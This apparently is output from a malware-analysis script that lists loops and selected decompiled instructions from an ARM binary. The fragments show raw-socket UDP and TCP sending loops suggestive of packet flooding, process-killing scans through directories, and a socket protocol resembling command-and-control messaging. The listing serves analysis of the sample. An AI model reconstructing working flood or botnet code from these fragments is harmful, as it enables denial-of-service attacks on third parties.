++++++++ INTRESTING INSTRUCTIONS :  
		inet_addr((char *)&cp);
		sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if (sock_fd == -1) {
		return sock_fd;
		if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
		result2 = close(sock_fd);
		while (true) {
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)fd, v406 + 47, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
		inet_addr((char *)&cp);
		sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if (sock_fd == -1) {
		return sock_fd;
		if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
		result2 = close(sock_fd);
		while (true) {
=============================WHILE LOOPS ID : 43 @ function_f2a8 ====================================
++++++++ WHILE START : 34444 
++++++++ WHILE FUNCTION : function_f2a8 
++++++++ WHILE END : 34967 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		close(fd2);
		dirp = opendir((char *)name);
		while (true) {
		while (true) {
		struct __dirstream * dirp2 = opendir((char *)&path); // 0xf65c
		while (true) {
		while (true) {
		kill(function_12e68((char *)v406, 10), SIGKILL);
		struct dirent * v424 = readdir((struct __dirstream *)dirp3); // 0xf758
		struct dirent * v425 = readdir((struct __dirstream *)dirp3); // 0xf66c
		closedir((struct __dirstream *)dirp3);
		v415 = readdir((struct __dirstream *)fd2);
		closedir((struct __dirstream *)dirp4);
		closedir((struct __dirstream *)dirp3);
		v415 = readdir((struct __dirstream *)fd2);
		struct dirent * v435 = readdir((struct __dirstream *)fd2); // 0xf578
		closedir((struct __dirstream *)fd2);
		closedir((struct __dirstream *)fd2);
		close(fd2);
		dirp = opendir((char *)name);
		while (true) {
		closedir((struct __dirstream *)fd2);
=============================WHILE LOOPS ID : 45 @ function_f828 ====================================
++++++++ WHILE START : 35405 
++++++++ WHILE FUNCTION : function_f828 
++++++++ WHILE END : 35570 
++++++++ INTRESTING INSTRUCTIONS :  
		struct __dirstream * v367 = opendir((char *)function_121a4(6, NULL)); // 0xf8e0
		struct dirent * v368 = readdir((struct __dirstream *)dirp); // 0xf8f822
		while (true) {
		while (true) {
		int32_t fd = open((char *)&path, O_RDONLY); // 0xfa04
		while (true) {
		close(time_val);
		v372 = readdir((struct __dirstream *)dirp);
		closedir((struct __dirstream *)dirp);
		struct dirent * v381 = readdir((struct __dirstream *)dirp); // 0xf974
		v372 = readdir((struct __dirstream *)dirp2);
		v372 = readdir((struct __dirstream *)dirp2);
		v372 = readdir((struct __dirstream *)dirp);
		closedir((struct __dirstream *)dirp);
		closedir((struct __dirstream *)dirp);
=============================WHILE LOOPS ID : 47 @ function_fdfc ====================================
++++++++ WHILE START : 37587 
++++++++ WHILE FUNCTION : function_fdfc 
++++++++ WHILE END : 37872 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t sock2;
		while (true) {
		v390 = sock2;
		int32_t sock;
		if (sock == -1) {
		int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x10308
		int32_t fd3 = sock_fd; // r5
		if (sock_fd != -1) {
		fcntl(sock_fd, F_GETFL);
		connect(sock, (struct sockaddr *)&addr, 16);
		uint32_t v395 = sock; // 0x10218
		int32_t v399 = sock; // 0x10110
		int32_t v400 = sock2; // 0x10134
		if (sock2 < v399) {
		send(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
		if (sock2 != -1) {
		if ((v403 >> sock2 % 32) % 2 != 0) {
		int32_t accepted_sock_fd = accept(sock2, (struct sockaddr *)&addr2, &addr_len); // 0x10400
		function_f294(function_10734(accepted_sock_fd));
		kill(-v363, SIGKILL);
		kill(pid, SIGKILL);
		uint32_t sock3 = sock; // 0x10244
		if (sock3 != -1) {
		if ((v408 >> sock3 % 32) % 2 != 0) {
		int32_t v409 = recv(sock, (int32_t *)&buf2, 2, MSG_PEEK | MSG_NOSIGNAL); // 0x102a4
		__pseudo_cond_branch(sock != -1, (int32_t)&v407);
		sock = -1;
		recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
		close(sock);
		int32_t v413 = recv(sock, &buf3, length, MSG_PEEK | MSG_NOSIGNAL); // 0x104f4
		recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
		recv(sock, &buf3, length2, MSG_NOSIGNAL);
		if ((v418 >> sock3 % 32) % 2 == 0) {
		__pseudo_cond_branch(sock3 != -1, (int32_t)&v407);
		getsockopt(sock3, SO_DEBUG, 4, &addr_len, &option_len);
		int32_t sock4; // 0x10458
		send(sock4, &buf4, 4, MSG_NOSIGNAL);
		int32_t sock5; // 0x10468
		send(sock5, (int32_t *)&buf2, 1, MSG_NOSIGNAL);
		int32_t sock6; // 0x10484
		send(sock6, &buf5, length3, MSG_NOSIGNAL);
		close(sock);
		v390 = sock2;
=============================WHILE LOOPS ID : 49 @ function_1081c ====================================
++++++++ WHILE START : 40208 
++++++++ WHILE FUNCTION : function_1081c 
++++++++ WHILE END : 40261 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 51 @ function_109d0 ====================================
++++++++ WHILE START : 40677 
++++++++ WHILE FUNCTION : function_109d0 
++++++++ WHILE END : 42538 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x10a9c
		sock = sock_fd;
		if (sock_fd == -1) {
		fcntl(sock_fd, F_GETFL);
		fcntl(sock_fd, F_SETFL);
		if (setsockopt(sock, status, 3, &status, 4) != 0) {
		close(sock);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		uint32_t v371 = recvfrom(sock, &buf, 1514, MSG_NOSIGNAL, NULL, NULL); // 0x110f8
		while (true) {
		close(fd);
		while (true) {
		int32_t sock18; // 0x11484
		if (sock18 != -1) {
		if ((v402 >> sock18 % 32) % 2 == 0) {
		v400 = sock18;
		while (true) {
		while (true) {
		int32_t sock2; // 0x11634
		int32_t v412 = recv(sock2, (int32_t *)buf2, 256 - v411, MSG_NOSIGNAL); // 0x11644
		close(fd2);
		while (true) {
		case 2: {
		while (true) {
		while (true) {
		int32_t sock3; // 0x11f8c
		send(sock3, &buf3, 3, MSG_NOSIGNAL);
		send(0x4000, (int32_t *)buf4, 3, MSG_NOSIGNAL);
		send(0x4000, (int32_t *)(int32_t)&buf5, 9, MSG_NOSIGNAL);
		while (true) {
		case 2: {
		while (true) {
		case 3: {
		while (true) {
		int32_t sock4; // 0x11804
		send(sock4, (int32_t *)buf6, (int32_t)length, MSG_NOSIGNAL);
		int32_t sock5; // 0x1181c
		send(sock5, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 4: {
		while (true) {
		int32_t sock6; // 0x11894
		send(sock6, (int32_t *)buf7, (int32_t)length2, MSG_NOSIGNAL);
		int32_t sock7; // 0x118ac
		send(sock7, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 5: {
		while (true) {
		int32_t sock8; // 0x1194c
		send(sock8, (int32_t *)buf8, (int32_t)length3, MSG_NOSIGNAL);
		int32_t sock9; // 0x11960
		send(sock9, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		while (true) {
		while (true) {
		case 6: {
		while (true) {
		int32_t sock10; // 0x11ab8
		send(sock10, (int32_t *)buf9, length4, MSG_NOSIGNAL);
		int32_t sock11; // 0x11acc
		send(sock11, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 7: {
		while (true) {
		int32_t sock12; // 0x11c20
		send(sock12, (int32_t *)buf10, length4, MSG_NOSIGNAL);
		int32_t sock13; // 0x11c34
		send(sock13, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 8: {
		while (true) {
		int32_t sock14; // 0x11b6c
		send(sock14, (int32_t *)buf11, (int32_t)length3, MSG_NOSIGNAL);
		int32_t sock15; // 0x11b80
		send(sock15, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 9: {
		while (true) {
		int32_t sock16; // 0x11d7c
		send(sock16, (int32_t *)buf12, (int32_t)length3, MSG_NOSIGNAL);
		int32_t sock17; // 0x11d90
		send(sock17, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 10: {
		int32_t v556 = fork(); // 0x11ee4
		int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x1203c
		t = sock_fd2;
		if (sock_fd2 == -1) {
		if (connect(t, (struct sockaddr *)&addr, 16) == -1) {
		close(t);
		send(t, (int32_t *)&length3, 1, MSG_NOSIGNAL);
		send(t, &length4, 4, MSG_NOSIGNAL);
		send(t, &buf13, 2, MSG_NOSIGNAL);
		send(t, (int32_t *)(v559 + 12), 1, MSG_NOSIGNAL);
		send(t, (int32_t *)buf14, (int32_t)length5, MSG_NOSIGNAL);
		send(t, (int32_t *)(v559 + 13), 1, MSG_NOSIGNAL);
		send(t, (int32_t *)buf15, (int32_t)length6, MSG_NOSIGNAL);
		close(t);
		close(fd3);
		close(fd4);
		while (true) {
		case 3: {
		case 4: {
		case 5: {
		case 6: {
		case 7: {
		case 8: {
		case 9: {
		case 10: {
		close(fd2);
		while (true) {
		if ((length4 || getsockopt(sock18, SO_DEBUG, 4, &length4, (int32_t *)&length3)) == 0) {
		while (true) {
		close(fd5);
		while (true) {
=============================WHILE LOOPS ID : 79 @ __udivsi3 ====================================
++++++++ WHILE START : 50522 
++++++++ WHILE FUNCTION : __udivsi3 
++++++++ WHILE END : 50734 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 80 @ __umodsi3 ====================================
++++++++ WHILE START : 51505 
++++++++ WHILE FUNCTION : __umodsi3 
++++++++ WHILE END : 51859 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 81 @ __modsi3 ====================================
++++++++ WHILE START : 52303 
++++++++ WHILE FUNCTION : __modsi3 
++++++++ WHILE END : 52683 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
